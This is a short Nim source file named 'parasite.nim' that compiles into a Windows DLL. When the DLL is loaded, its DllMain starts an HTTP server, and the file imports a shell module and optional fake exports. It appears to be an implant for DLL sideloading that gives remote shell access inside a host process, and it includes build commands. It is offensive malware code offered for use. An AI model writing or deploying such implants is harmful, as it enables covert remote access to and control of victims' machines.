import winim
import httpserv
import shell
when defined(fakeexports):
  import fakeexports

# compile: nim c -d=mingw --app=lib --nomain --cpu=amd64 parasite.nim
# nim c --app=lib --nomain --cpu=amd64 parasite.nim

proc NimMain() {.cdecl, importc.}

proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
  if fdwReason != DLL_PROCESS_ATTACH:
    return true

  NimMain()
  
  runHttpServ()  # beware the loader lock

  return true
